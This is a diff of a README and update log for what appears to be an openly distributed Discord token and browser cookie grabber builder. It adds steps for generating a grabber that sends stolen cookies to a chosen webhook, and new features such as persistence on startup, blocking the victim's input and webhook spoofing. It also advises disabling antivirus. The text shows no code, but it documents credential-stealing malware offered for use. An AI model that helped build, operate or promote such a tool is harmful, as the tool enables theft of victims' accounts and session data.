@@ -1,4 +1,9 @@
 # Update Log
+[06/28/2023]
+- Completely reworked the api to work with 10 new browser.
+- Reworked the building to decrease setup time drastically.
+- Added new features like attaching on startup, blocking user input, etc.
+  
 [06/03/2023]
 - Minor bug fixes.
 - Added webhook spoofing.
@@ -53,17 +58,17 @@ Download the zip file and uncompress it.
 
 It **shouldn't** be flagged by your antivirus but if it is just disable it.
 
-# Instructions (V2)
+# Instructions (V4)
 *View pictures at the bottom for help*
 
 How to use 
-1. Run main.exe
+1. Run Grabber Setup.exe
 2. Wait about 5-10 seconds while it loads all of the requirements in.
 3. Put in the name of your grabber.
 4. Put in the webhook from the channel you want to receive cookies from.
 5. When it is complete check the same directory as the setup for a grabber python script that you can convert to exe.
 
-# Features (V2)
+# Features (V4)
 
 - Discord token info
 - Nitro
